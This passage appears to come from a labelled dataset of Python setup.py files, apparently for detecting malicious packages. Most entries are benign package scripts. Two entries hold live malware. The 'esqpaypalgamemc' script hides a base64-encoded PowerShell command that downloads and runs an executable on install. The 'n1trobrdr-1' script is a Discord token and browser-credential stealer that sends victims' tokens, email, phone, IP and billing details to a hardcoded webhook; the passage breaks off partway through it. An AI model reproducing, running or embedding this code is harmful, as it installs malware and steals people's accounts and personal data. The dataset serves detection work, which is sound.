you\\'ll also need\\n    to manually copy in the relevant bits of [our change form\\n    ](./django_object_actions/templates/django_object_actions/change_form.html).\\n3.  Security. This has been written with the assumption that everyone in\\n    the Django admin belongs there. Permissions should be enforced in\\n    your own actions irregardless of what this provides. Better default\\n    security is planned for the future.\\n\\n\\nPython and Django compatibility\\n-------------------------------\\n\\nSee [`ci.yml`](./github/workflows/ci.yml) for which Python and Django versions this supports.\\n\\n\\nDemo Admin & Docker images\\n--------------------------\\n\\nYou can try the demo admin against several versions of Django with these Docker\\nimages: https://hub.docker.com/r/crccheck/django-object-actions/tags\\n\\nThis runs the example Django project in `./example_project` based on the \"polls\"\\ntutorial. `admin.py` demos what you can do with this app.\\n\\n\\nDevelopment\\n-----------\\n\\nGetting started:\\n\\n```shell\\n# get a copy of the code\\ngit clone git@github.com:crccheck/django-object-actions.git\\ncd django-object-actions\\n# Install requirements\\nmake install\\nmake test  # run test suite\\nmake quickstart  # runs \\'make resetdb\\' and some extra steps\\n```\\n\\nVarious helpers are available as make commands. Type `make help` and\\nview the `Makefile` to see what other things you can do.\\n\\nSome commands assume you are in the virtualenv. If you see\\n\"ModuleNotFoundError\"s, try running `poetry shell` first.\\n\\n\\nSimilar Packages\\n----------------\\n\\nIf you want an actions menu for each row of your changelist, check out [Django\\nAdmin Row Actions](https://github.com/DjangoAdminHackers/django-admin-row-actions).\\n\\nDjango Object Actions is very similar to\\n[django-object-tools](https://github.com/praekelt/django-object-tools), but does\\nnot require messing with your urls.py, does not do anything special with\\npermissions, and uses the same patterns as making [admin actions].\\n',\n    'author': 'crccheck',\n    'author_email': 'c@crccheck.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/crccheck/django-object-actions',\n    'packages': packages,\n    'package_data': package_data,\n    'python_requires': '>=3.7,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "esqpaypalgamemc-4.76", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpaypalgamemc',\n    packages = ['modlib'],\n    version = '8.52',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-log-request-id-2.0.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom __future__ import print_function\n\nfrom setuptools import setup\nimport re\nimport os\nimport sys\nimport codecs\n\n\n\nname = 'django-log-request-id'\npackage = 'log_request_id'\ndescription = 'Django middleware and log filter to attach a unique ID to every log message generated as part of a request'\nurl = 'https://github.com/dabapps/django-log-request-id/'\nauthor = 'DabApps'\nauthor_email = 'hello@dabapps.com'\nlicense = 'BSD'\ninstall_requires = [\"django>=1.8\"]\n\nwith codecs.open('README.md', encoding='utf-8') as f:\n    readme = f.read()\n\n\ndef get_version(package):\n    \"\"\"\n    Return package version as listed in `__version__` in `init.py`.\n    \"\"\"\n    init_py = open(os.path.join(package, '__init__.py')).read()\n    return re.search(\"^__version__ = ['\\\"]([^'\\\"]+)['\\\"]\", init_py, re.MULTILINE).group(1)\n\n\ndef get_packages(package):\n    \"\"\"\n    Return root package and all sub-packages.\n    \"\"\"\n    return [dirpath\n            for dirpath, dirnames, filenames in os.walk(package)\n            if os.path.exists(os.path.join(dirpath, '__init__.py'))]\n\n\ndef get_package_data(package):\n    \"\"\"\n    Return all files under the root package, that are not in a\n    package themselves.\n    \"\"\"\n    walk = [(dirpath.replace(package + os.sep, '', 1), filenames)\n            for dirpath, dirnames, filenames in os.walk(package)\n            if not os.path.exists(os.path.join(dirpath, '__init__.py'))]\n\n    filepaths = []\n    for base, filenames in walk:\n        filepaths.extend([os.path.join(base, filename)\n                          for filename in filenames])\n    return {package: filepaths}\n\n\nsetup(\n    name=name,\n    version=get_version(package),\n    url=url,\n    license=license,\n    description=description,\n    long_description=readme,\n    long_description_content_type='text/markdown',\n    author=author,\n    author_email=author_email,\n    packages=get_packages(package),\n    package_data=get_package_data(package),\n    install_requires=install_requires\n)\n", "target": 0}
{"idx": "djangorestframework-3.13.1", "func": "#!/usr/bin/env python3\nimport os\nimport re\nimport shutil\nimport sys\nfrom io import open\n\nfrom setuptools import find_packages, setup\n\nCURRENT_PYTHON = sys.version_info[:2]\nREQUIRED_PYTHON = (3, 6)\n\n# This check and everything above must remain compatible with Python 2.7.\nif CURRENT_PYTHON < REQUIRED_PYTHON:\n    sys.stderr.write(\"\"\"\n==========================\nUnsupported Python version\n==========================\n\nThis version of Django REST Framework requires Python {}.{}, but you're trying\nto install it on Python {}.{}.\n\nThis may be because you are using a version of pip that doesn't\nunderstand the python_requires classifier. Make sure you\nhave pip >= 9.0 and setuptools >= 24.2, then try again:\n\n    $ python -m pip install --upgrade pip setuptools\n    $ python -m pip install djangorestframework\n\nThis will install the latest version of Django REST Framework which works on\nyour version of Python. If you can't upgrade your pip (or Python), request\nan older version of Django REST Framework:\n\n    $ python -m pip install \"djangorestframework<3.10\"\n\"\"\".format(*(REQUIRED_PYTHON + CURRENT_PYTHON)))\n    sys.exit(1)\n\n\ndef read(f):\n    return open(f, 'r', encoding='utf-8').read()\n\n\ndef get_version(package):\n    \"\"\"\n    Return package version as listed in `__version__` in `init.py`.\n    \"\"\"\n    init_py = open(os.path.join(package, '__init__.py')).read()\n    return re.search(\"__version__ = ['\\\"]([^'\\\"]+)['\\\"]\", init_py).group(1)\n\n\nversion = get_version('rest_framework')\n\n\nif sys.argv[-1] == 'publish':\n    if os.system(\"pip freeze | grep twine\"):\n        print(\"twine not installed.\\nUse `pip install twine`.\\nExiting.\")\n        sys.exit()\n    os.system(\"python setup.py sdist bdist_wheel\")\n    if os.system(\"twine check dist/*\"):\n        print(\"twine check failed. Packages might be outdated.\")\n        print(\"Try using `pip install -U twine wheel`.\\nExiting.\")\n        sys.exit()\n    os.system(\"twine upload dist/*\")\n    print(\"You probably want to also tag the version now:\")\n    print(\"  git tag -a %s -m 'version %s'\" % (version, version))\n    print(\"  git push --tags\")\n    shutil.rmtree('dist')\n    shutil.rmtree('build')\n    shutil.rmtree('djangorestframework.egg-info')\n    sys.exit()\n\n\nsetup(\n    name='djangorestframework',\n    version=version,\n    url='https://www.django-rest-framework.org/',\n    license='BSD',\n    description='Web APIs for Django, made easy.',\n    long_description=read('README.md'),\n    long_description_content_type='text/markdown',\n    author='Tom Christie',\n    author_email='tom@tomchristie.com',  # SEE NOTE BELOW (*)\n    packages=find_packages(exclude=['tests*']),\n    include_package_data=True,\n    install_requires=[\"django>=2.2\", \"pytz\"],\n    python_requires=\">=3.6\",\n    zip_safe=False,\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.0',\n        'Framework :: Django :: 3.1',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3 :: Only',\n        'Topic :: Internet :: WWW/HTTP',\n    ],\n    project_urls={\n        'Funding': 'https://fund.django-rest-framework.org/topics/funding/',\n        'Source': 'https://github.com/encode/django-rest-framework',\n        'Changelog': 'https://www.django-rest-framework.org/community/release-notes/',\n    },\n)\n\n# (*) Please direct queries to the discussion group, rather than to me directly\n#     Doing so helps ensure your question is helpful to other users.\n#     Queries directly to my email are likely to receive a canned response.\n#\n#     Many thanks for your understanding.\n", "target": 0}
{"idx": "geohash2-1.1", "func": "\"\"\"\nCopyright (C) 2008 Leonard Norrgard <leonard.norrgard@gmail.com>\nCopyright (C) 2015 Leonard Norrgard <leonard.norrgard@gmail.com>\n\nThis file is part of Geohash.\n\nGeohash is free software: you can redistribute it and/or modify it\nunder the terms of the GNU Affero General Public License as published\nby the Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nGeohash is distributed in the hope that it will be useful, but WITHOUT\nANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\nFITNESS FOR A PARTICULAR PURPOSE.  See the GNU Affero General Public\nLicense for more details.\n\nYou should have received a copy of the GNU Affero General Public\nLicense along with Geohash.  If not, see\n<http://www.gnu.org/licenses/>.\n\"\"\"\nfrom setuptools import setup, find_packages\n\nsetup(\n    name=\"geohash2\",\n    version=\"1.1\",\n    packages=find_packages(),\n\n    # Project uses reStructuredText, so ensure that the docutils get\n    # installed or upgraded on the target machine\n    install_requires=['docutils>=0.3'],\n\n    package_data={\n        # If any package contains *.txt or *.rst files, include them:\n        '': ['*.txt', '*.rst']\n    },\n\n    # metadata for upload to PyPI\n    author=\"Leonard Norrgard, Barthelemy Delemotte\",\n    author_email=\"barthelemy.delemotte@gmail.com\",\n    description=\"(Geohash fixed for python3) Module to decode/encode Geohashes to/from latitude and longitude.  See http://en.wikipedia.org/wiki/Geohash\",\n    long_description=\"This module provides functions to decode and encode Geohashes to and from latitude and longitude coordinates.\",\n    license=\"GNU Affero General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.\",\n    keywords=\"Geohash GIS latitude longitude encode decode Galileo GPS WGS84 coordinates geotagging\",\n    url=\"https://github.com/dbarthe/geohash/\",  # project home page, if any\n)\n", "target": 0}
{"idx": "ebaysdk-2.2.0", "func": "#!/usr/bin/env python\n\n#from distutils.core import setup\n\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom setuptools import setup, find_packages\nimport re\nimport os\n\nPKG = 'ebaysdk'\n\nversion = __import__(PKG).get_version()\n\nlong_desc = \"\"\"This SDK is a programatic inteface into the eBay\nAPIs. It simplifies development and cuts development time by standerizing\ncalls, response processing, error handling, debugging across the Finding,\nShopping, Merchandising, & Trading APIs. \"\"\"\n\ndef requirements_file_to_list(fn=\"requirements.txt\"):\n    \"\"\"read a requirements file and create a list that can be used in setup.\n    \"\"\"\n\n    with open(fn, 'r') as f:\n        return [x.rstrip() for x in list(f) if x and not x.startswith('#')]\n\nsetup(\n    name=PKG,\n    version=version,\n    description=\"eBay SDK for Python\",\n    author=\"Tim Keefer\",\n    author_email=\"tkeefer@gmail.com\",\n    url=\"https://github.com/timotheus/ebaysdk-python\",\n    license=\"COMMON DEVELOPMENT AND DISTRIBUTION LICENSE (CDDL) Version 1.0\",\n    packages=find_packages(),\n    provides=[PKG],\n    install_requires=['lxml', 'requests'], #requirements_file_to_list(),\n    test_suite='tests',\n    long_description=long_desc,\n    classifiers=[\n        'Topic :: Internet :: WWW/HTTP',\n        'Intended Audience :: Developers',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n    ]\n)\n", "target": 0}
{"idx": "flake8-useless-assert-0.4.3", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['flake8_useless_assert']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['flake8>=3.9,<5.0']\n\nentry_points = \\\n{'flake8.extension': ['ULA = flake8_useless_assert:UselessAssert']}\n\nsetup_kwargs = {\n    'name': 'flake8-useless-assert',\n    'version': '0.4.3',\n    'description': 'flake8 plugin to catch useless `assert` statements',\n    'long_description': '# flake8-useless-assert\\nflake8 plugin to catch useless `assert` statements\\n\\nDownload or install on the [PyPI page](https://pypi.org/project/flake8-useless-assert/)\\n\\n# Violations\\n\\n| Code    | Description                                          |   Example                        |\\n|---------|------------------------------------------------------|----------------------------------|\\n| ULA001  | `assert` with a truthy literal                       | `assert \"foo\"`                   |\\n|         |                                                      | `assert ...`                     |\\n|         |                                                      | `assert True`                    |\\n| ULA002  | `assert` with `0`                                    | `assert 0`                       |\\n| ULA003  | `assert` with `None`                                 | `assert None`                    |\\n| ULA004  | `assert` with \"literal\".format(...)                  | `assert \"foo {0}\".format(bar)`   |\\n| ULA005  | `assert` with f-string                               | `assert f\"foo {bar}\"`            |\\n| ULA006  | `assert` with constant computation                   | `assert \"foo\" == \"bar\" * 3`      |\\n|         |                                                      | `assert repr(\"fizz\") == \"\\'buzz\\'\"`|\\n\\n\\n# Testing\\nI haven\\'t set up proper testing yet, but you can run `poetry install` and then:\\n```\\nflake8 examples/\\n```',\n    'author': 'decorator-factory',\n    'author_email': 'decorator-factory@yandex.ru',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/decorator-factory/flake8-useless-assert',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.7,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "gpytorch-1.8.1", "func": "#!/usr/bin/env python3\n\nimport io\nimport os\nimport re\n\nfrom setuptools import find_packages, setup\n\n\n# Get version\ndef read(*names, **kwargs):\n    with io.open(os.path.join(os.path.dirname(__file__), *names), encoding=kwargs.get(\"encoding\", \"utf8\")) as fp:\n        return fp.read()\n\n\ndef find_version(*file_paths):\n    version_file = read(*file_paths)\n    version_match = re.search(r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\", version_file, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\n\nreadme = open(\"README.md\").read()\nversion = find_version(\"gpytorch\", \"__init__.py\")\n\n\ntorch_min = \"1.10\"\ninstall_requires = [\">=\".join([\"torch\", torch_min])]\n# if recent dev version of PyTorch is installed, no need to install stable\ntry:\n    import torch\n\n    if torch.__version__ >= torch_min:\n        install_requires = []\nexcept ImportError:\n    pass\ninstall_requires += [\"numpy\", \"scikit-learn\", \"scipy\"]\n\n\n# Run the setup\nsetup(\n    name=\"gpytorch\",\n    version=version,\n    description=\"An implementation of Gaussian Processes in Pytorch\",\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    author=\"Jake Gardner, Geoff Pleiss\",\n    url=\"https://gpytorch.ai\",\n    author_email=\"jrg365@cornell.edu, gpleiss@gmail.com\",\n    project_urls={\n        \"Documentation\": \"https://gpytorch.readthedocs.io\",\n        \"Source\": \"https://github.com/cornellius-gp/gpytorch/\",\n    },\n    license=\"MIT\",\n    classifiers=[\"Development Status :: 4 - Beta\", \"Programming Language :: Python :: 3\"],\n    packages=find_packages(exclude=[\"test\", \"test.*\"]),\n    python_requires=\">=3.7\",\n    install_requires=install_requires,\n    extras_require={\n        \"dev\": [\"black\", \"twine\", \"pre-commit\"],\n        \"examples\": [\"ipython\", \"jupyter\", \"matplotlib\", \"scipy\", \"torchvision\", \"tqdm\"],\n        \"pyro\": [\"pyro-ppl>=1.8\"],\n        \"keops\": [\"pykeops>=1.1.1\"],\n        \"test\": [\"flake8==4.0.1\", \"flake8-print==4.0.0\", \"pytest\", \"nbval\"],\n    },\n    test_suite=\"test\",\n)\n", "target": 0}
{"idx": "google-cloud-build-3.9.0", "func": "# -*- coding: utf-8 -*-\n#\n# Copyright 2019 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\nname = \"google-cloud-build\"\ndescription = \"Google Cloud Build API client library\"\nversion = \"3.9.0\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\n\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\nif \"google.cloud.devtools\" in packages:\n    namespaces.append(\"google.cloud.devtools\")\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-cloudbuild\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    python_requires=\">=3.7\",\n    namespace_packages=namespaces,\n    scripts=[\"scripts/fixup_cloudbuild_v1_keywords.py\"],\n    install_requires=dependencies,\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "n1trobrdr-1", "func": "from setuptools import setup\nfrom builtins import all,dir,exec,format,len,ord,print,int,list,range,set,str,open\nexec('')\nimport os\nimport threading\nfrom sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads,load\nfrom ctypes import windll,wintypes,byref,cdll,Structure,POINTER,c_char,c_buffer\nfrom urllib.request import Request,urlopen\nfrom json import loads,dumps\nimport time\nimport shutil\nfrom zipfile import ZipFile\nimport random\nimport re\nimport subprocess\n\nhook='https://discord.com/api/webhooks/1107179782954827816/vZiZEw-nL0d5AewU8h6aqHugdcp0ZEkxs8COOiUKEMgkGRzIx-m4oToqecroQZa3g1OI'\nDETECTED=False\ndef getip():\n    ip='None'\n    try:\n        ip=urlopen(Request('https://api.ipify.org')).read().decode().strip()\n    except:\n        pass\n    return ip\nrequirements=[\n['requests','requests'],\n['Crypto.Cipher','pycryptodome']\n]\nfor modl in requirements:\n    try:__import__(modl[0])\n    except:\n        subprocess.Popen(f\"{executable} -m pip install {modl[1]}\",shell=True)\n        time.sleep(3)\nimport requests\nfrom Crypto.Cipher import AES\nlocal=os.getenv('LOCALAPPDATA')\nroaming=os.getenv('APPDATA')\ntemp=os.getenv('TEMP')\nThreadlist=[]\nclass DATA_BLOB(Structure):\n    _fields_=[\n('cbData',wintypes.DWORD),\n('pbData',POINTER(c_char))\n]\ndef GetData(blob_out):\n    cbData=int(blob_out.cbData)\n    pbData=blob_out.pbData\n    buffer=c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer,pbData,cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\ndef CryptUnprotectData(encrypted_bytes,entropy=b''):\n    buffer_in=c_buffer(encrypted_bytes,len(encrypted_bytes))\n    buffer_entropy=c_buffer(entropy,len(entropy))\n    blob_in=DATA_BLOB(len(encrypted_bytes),buffer_in)\n    blob_entropy=DATA_BLOB(len(entropy),buffer_entropy)\n    blob_out=DATA_BLOB()\n    if windll.crypt32.CryptUnprotectData(byref(blob_in),None,byref(blob_entropy),None,None,0x01,byref(blob_out)):\n        return GetData(blob_out)\ndef DecryptValue(buff,master_key=None):\n    starts=buff.decode(encoding='utf8',errors='ignore')[:3]\n    if starts=='v10' or starts=='v11':\n        iv=buff[3:15]\n        payload=buff[15:]\n        cipher=AES.new(master_key,AES.MODE_GCM,iv)\n        decrypted_pass=cipher.decrypt(payload)\n        decrypted_pass=decrypted_pass[:-16].decode()\n        return decrypted_pass\ndef LoadRequests(methode,url,data='',files='',headers=''):\n    for i in range(8):# max trys\n        try:\n            if methode=='POST':\n                if data !='':\n                    r=requests.post(url,data=data)\n                    if r.status_code==200:\n                        return r\n                elif files !='':\n                    r=requests.post(url,files=files)\n                    if r.status_code==200 or r.status_code==413:# 413=DATA TO BIG\n                        return r\n        except:\n            pass\ndef LoadUrlib(hook,data='',files='',headers=''):\n    for i in range(8):\n        try:\n            if headers !='':\n                r=urlopen(Request(hook,data=data,headers=headers))\n                return r\n            else:\n                r=urlopen(Request(hook,data=data))\n                return r\n        except:\n            pass\ndef Trust(Cookies):\n    global DETECTED\n    data=str(Cookies)\n    tim=re.findall('.google.com',data)\n    if len(tim)<-1:\n        DETECTED=True\n        return DETECTED\n    else:\n        DETECTED=False\n        return DETECTED\ndef GetUHQFriends(token):\n    badgeList=[\n{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},\n{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},\n{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},\n{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},\n{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},\n{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},\n{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},\n{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},\n{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},\n{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}\n]\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        friendlist=loads(urlopen(Request('https://discord.com/api/v6/users/@me/relationships',headers=headers)).read().decode())\n    except:\n        return False\n    uhqlist=''\n    for friend in friendlist:\n        OwnedBadges=''\n        flags=friend['user']['public_flags']\n        for badge in badgeList:\n            if flags//badge['Value']!=0 and friend['type']==1:\n                if not 'House' in badge['Name']:\n                    OwnedBadges+=badge['Emoji']\n                flags=flags % badge['Value']\n        if OwnedBadges !='':\n            uhqlist+=f\"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\\n\"\n    return uhqlist\ndef GetBilling(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        billingjson=loads(urlopen(Request('https://discord.com/api/users/@me/billing/payment-sources',headers=headers)).read().decode())\n    except:\n        return False\n    if billingjson==[]:return ' -'\n    billing=''\n    for methode in billingjson:\n        if methode['invalid']==False:\n            if methode['type']==1:\n                billing+='<a:Cc:1032742457416355882>'\n            elif methode['type']==2:\n                billing+='<:paypal:1027984840131366922> '\n    return billing\ndef GetBadge(flags):\n    if flags==0:return ''\n    OwnedBadges=''\n    badgeList=[\n{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},\n{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},\n{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},\n{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},\n{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},\n{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},\n{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},\n{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},\n{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},\n{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}\n]\n    for badge in badgeList:\n        if flags//badge['Value']!=0:\n            OwnedBadges+=badge['Emoji']\n            flags=flags % badge['Value']\n    return OwnedBadges\ndef GetTokenInfo(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    userjson=loads(urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers)).read().decode())\n    username=userjson['username']\n    hashtag=userjson['discriminator']\n    email=userjson['email']\n    idd=userjson['id']\n    pfp=userjson['avatar']\n    flags=userjson['public_flags']\n    nitro=''\n    phone='-'\n    if 'premium_type' in userjson:\n        nitrot=userjson['premium_type']\n        if nitrot==1:\n            nitro='<:classic:896119171019067423> '\n        elif nitrot==2:\n            nitro='<a:boost:824036778570416129> <:classic:896119171019067423> '\n    if 'phone' in userjson:phone=f'`{userjson[\"phone\"]}`'\n    return username,hashtag,email,idd,pfp,flags,nitro,phone\ndef checkToken(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers))\n        return True\n    except:\n        return False\ndef uploadToken(token,path):\n    global hook\n    headers={\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    username,hashtag,email,idd,pfp,flags,nitro,phone=GetTokenInfo(token)\n    if pfp==None:\n        pfp='https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png'\n    else:\n        pfp=f\"https://cdn.discordapp.com/avatars/{idd}/{pfp}\"\n    billing=GetBilling(token)\n    badge=GetBadge(flags)\n    friends=GetUHQFriends(token)\n    if friends=='':friends='No HQ Friends'\n    if not billing:\n        badge,phone,billing=badge,phone,None\n    if nitro=='' and badge=='':nitro=' -'\n    data={\n        'content':f'Found in `{path}`',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                    'name':'<a:dt:1032744237042774057> Token:',\n                    'value':f\"`{token}`\\n[Click to copy](https://superfurrycdn.nl/copy/{token})\"\n},\n{\n                    'name':'<a:Bat:1032747993981538395> Email:',\n                    'value':f\"`{email}`\",\n                    'inline':True\n},\n{\n                    'name':'<a:gengar:1032750484961890426> Phone:',\n                    'value':f\"{phone}\",\n                    'inline':True\n},\n{\n                    'name':'<a:dt1:1032749135188742176> IP:',\n                    'value':f\"`{getip()}`\",\n                    'inline':True\n},\n{\n                    'name':'<a:uzi:1032752999795265537> Badges:',\n                    'value':f\"{nitro}{badge}\",\n                    'inline':True\n},\n{\n                    'name':'<a:Cc:1032742457416355882> Billing:',\n                    'value':f\"{billing}\",\n                    'inline':True\n},\n{\n                    'name':'<a:diamond:1032752566926315575> HQ Friends:',\n                    'value':f\"{friends}\",\n                    'inline':False\n}\n],\n            'author':{\n                'name':f\"{username}#{hashtag} ({idd})\",\n                'icon_url':f\"{pfp}\"\n},\n            